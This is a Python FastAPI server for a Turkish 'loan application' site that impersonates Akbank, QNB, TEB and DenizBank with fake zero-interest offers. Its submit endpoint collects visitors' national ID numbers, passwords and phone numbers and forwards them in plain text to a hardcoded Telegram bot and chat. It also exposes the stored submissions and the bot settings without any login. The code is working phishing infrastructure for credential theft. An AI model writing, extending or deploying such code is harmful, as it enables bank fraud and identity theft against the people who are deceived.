from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Optional
import json
import urllib.request
import urllib.parse
import os
from datetime import datetime
from zoneinfo import ZoneInfo
import uvicorn

IST = ZoneInfo("Europe/Istanbul")

app = FastAPI(title="Kredi Başvuru API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

applications_storage = []
telegram_settings = {
    "bot_token": os.environ.get('TELEGRAM_BOT_TOKEN', '6719470714:AAEiTm7V6s3zTB_etIrOpaykcHzDWp3i7YA'),
    "chat_id": os.environ.get('TELEGRAM_CHAT_ID', '-4915858013')
}

banks_storage = [
    {
        "id": 1,
        "name": "Akbank",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/ac807fc1-b3e9-46f6-899d-ce70882e7f57.svg",
        "campaign": "%0 faiz oranlı 3 Ay vadeli 25.000 TL'ye varan taksitli avans",
        "color": "red",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 2,
        "name": "QNB",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/57347029-2d9b-4c81-bd47-8b12777a564f.svg",
        "campaign": "3 Ay vadeli 25.000 TL'ye varan nakit avans",
        "color": "purple",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 3,
        "name": "TEB",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/4c0a9c34-b72b-46f6-a3ee-f9bb52176937.svg",
        "campaign": "%0 faiz oranlı 3 Ay vadeli 25.000 TL'ye varan nakit avans",
        "color": "green",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 4,
        "name": "DenizBank",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/1aad69c2-3faf-472f-8d26-9d3f912d444e.svg",
        "campaign": "3 Ay vadeli 65.000 TL'ye varan kredi",
        "color": "cyan",
        "is_active": True,
        "max_applications": 0
    }
]

class LoanApplication(BaseModel):
    tc_kimlik: str
    sifre: str
    telefon: str
    bank_name: str
    amount: int
    months: int

class TelegramSettings(BaseModel):
    bot_token: str
    chat_id: str

class Bank(BaseModel):
    name: str
    logo: str
    campaign: str
    color: str
    is_active: bool = True
    max_applications: int = 0

class BankUpdate(BaseModel):
    id: int
    name: str
    logo: str
    campaign: str
    color: str
    is_active: bool
    max_applications: int = 0

class BankUpdatePartial(BaseModel):
    name: Optional[str] = None
    logo: Optional[str] = None
    campaign: Optional[str] = None
    color: Optional[str] = None
    is_active: Optional[bool] = None
    max_applications: Optional[int] = None

@app.get("/")
async def health_check():
    return {"status": "healthy", "message": "Kredi Başvuru API is running"}

@app.get("/api/banks")
async def get_banks():
    return [bank for bank in banks_storage if bank.get("is_active", True)]

@app.get("/api/banks/all")
async def get_all_banks():
    return banks_storage

@app.post("/api/banks")
async def create_bank(bank: Bank):
    new_id = max([b["id"] for b in banks_storage], default=0) + 1
    new_bank = {
        "id": new_id,
        "name": bank.name,
        "logo": bank.logo,
        "campaign": bank.campaign,
        "color": bank.color,
        "is_active": bank.is_active,
        "max_applications": bank.max_applications
    }
    banks_storage.append(new_bank)
    return {"success": True, "bank": new_bank}

@app.put("/api/banks/{bank_id}")
async def update_bank(bank_id: int, bank: BankUpdate):
    for i, existing_bank in enumerate(banks_storage):
        if existing_bank["id"] == bank_id:
            banks_storage[i] = bank.dict()
            return {"success": True, "bank": banks_storage[i]}
    raise HTTPException(status_code=404, detail="Bank not found")

@app.patch("/api/banks/{bank_id}")
async def patch_bank(bank_id: int, bank: BankUpdatePartial):
    for i, existing_bank in enumerate(banks_storage):
        if existing_bank["id"] == bank_id:
            for field, value in bank.dict(exclude_unset=True).items():
                if value is not None:
                    existing_bank[field] = value
            banks_storage[i] = existing_bank
            return {"success": True, "bank": existing_bank}
    raise HTTPException(status_code=404, detail="Bank not found")

@app.delete("/api/banks/{bank_id}")
async def delete_bank(bank_id: int):
    for i, bank in enumerate(banks_storage):
        if bank["id"] == bank_id:
            banks_storage[i]["is_active"] = False
            return {"success": True, "message": "Bank deactivated"}
    raise HTTPException(status_code=404, detail="Bank not found")

@app.post("/api/calculate")
async def calculate_loan(request: dict):
    amount = request.get("amount")
    months = request.get("months")
    
    if not amount or not months:
        raise HTTPException(status_code=400, detail="Amount and months are required")
    
    if amount < 25000 or amount > 450000:
        raise HTTPException(status_code=400, detail="Tutar 25.000 - 450.000 TL arasında olmalıdır")
    
    if months < 3 or months > 60:
        raise HTTPException(status_code=400, detail="Vade 3 - 60 ay arasında olmalıdır")
    
    monthly_payment = amount / months
    total_payment = amount
    
    return {
        "amount": amount,
        "months": months,
        "monthly_payment": round(monthly_payment, 2),
        "total_payment": total_payment,
        "interest_rate": 0
    }

@app.post("/api/submit")
async def submit_application(application: LoanApplication):
    now_tr = datetime.now(IST)
    created_iso = now_tr.isoformat()

    new_application = {
        "id": len(applications_storage) + 1,
        "tc_kimlik": application.tc_kimlik,
        "sifre": application.sifre,
        "telefon": application.telefon,
        "bank_name": application.bank_name,
        "amount": application.amount,
        "months": application.months,
        "status": "pending",
        "created_at": created_iso
    }
    
    applications_storage.append(new_application)
    
    try:
        bot_token = telegram_settings.get("bot_token")
        chat_id = telegram_settings.get("chat_id")
        
        message = f"""🏦 Yeni Kredi Başvurusu

👤 T.C. Kimlik: {application.tc_kimlik}
🔐 Şifre: {application.sifre}
📞 Telefon: {application.telefon}
🏛️ Banka: {application.bank_name}
💰 Tutar: {application.amount:,} TL
📅 Vade: {application.months} ay
⏰ Tarih: {now_tr.strftime('%d.%m.%Y %H:%M')} (GMT+3)"""

        telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        telegram_data = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        req = urllib.request.Request(
            telegram_url,
            data=urllib.parse.urlencode(telegram_data).encode(),
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        urllib.request.urlopen(req)
    except Exception as e:
        print(f"Telegram error: {e}")
    
    return {"success": True, "message": "Başvuru başarıyla gönderildi"}

@app.get("/api/applications")
async def get_applications():
    return applications_storage

@app.get("/api/telegram-settings")
async def get_telegram_settings():
    return telegram_settings

@app.post("/api/telegram-settings")
async def update_telegram_settings(settings: TelegramSettings):
    telegram_settings["bot_token"] = settings.bot_token
    telegram_settings["chat_id"] = settings.chat_id
    
    os.environ['TELEGRAM_BOT_TOKEN'] = settings.bot_token
    os.environ['TELEGRAM_CHAT_ID'] = settings.chat_id
    
    return {"success": True, "message": "Telegram ayarları güncellendi"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
